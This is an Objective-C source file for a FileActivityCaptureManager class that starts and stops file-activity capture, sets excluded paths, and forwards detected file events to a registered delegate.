//
//  FileActivityCaptureManager.m
//  FileActivityCaptureManager
//
//  Created by ophat on 9/22/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "FileActivityCaptureManager.h"

@implementation FileActivityCaptureManager
@synthesize mFileActivityNotify;

-(id)init{
    if ((self = [super init])) {
        mFileActivityNotify = [[FileActivityNotify alloc] init];
        [mFileActivityNotify setMDelegate:self];
        [mFileActivityNotify setMSelector:@selector(FileActivityEventDetected:)];
    }
    return self;
}

- (void) startCapture{
    DLog(@"FileActivityNotify ==> startCapture");
    [mFileActivityNotify startCapture];
}

- (void) stopCapture{
    DLog(@"FileActivityNotify ==> stopCapture");
    [mFileActivityNotify stopCapture];
}

- (void) setExcludePathForCapture:(NSArray *)aPath setActionForCapture:(NSArray * )aAction {
    [self stopCapture];
    DLog(@"################# ExcludePath");
    DLog(@"aAction %@",aAction);
    DLog(@"aPath %@",aPath);
    DLog(@"#################");
    [mFileActivityNotify setMAction:aAction];
    [mFileActivityNotify setMExcludePath:aPath];
}


- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) FileActivityEventDetected: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        DLog(@"FileActivityEventDetected event: %@", aEvent);
        [mEventDelegate eventFinished:aEvent];
    }
}

-(void)dealloc { 
    [mFileActivityNotify release];
    [super dealloc];
}
@end
